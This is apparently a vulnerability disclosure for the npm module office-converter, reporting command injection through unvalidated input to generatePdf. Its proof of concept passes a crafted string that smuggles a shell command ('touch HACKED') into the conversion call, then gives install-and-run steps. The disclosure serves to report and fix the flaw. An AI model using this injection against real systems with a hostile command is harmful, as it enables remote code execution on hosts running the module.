# Description

The `office-converter` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
var converter = require('office-converter')();
converter.generatePdf('"; touch HACKED; #', function(err, result) {
    if (result.status === 0) {
      console.log('Output File located at ' + result.outputFile);
    }
});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i office-converter # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
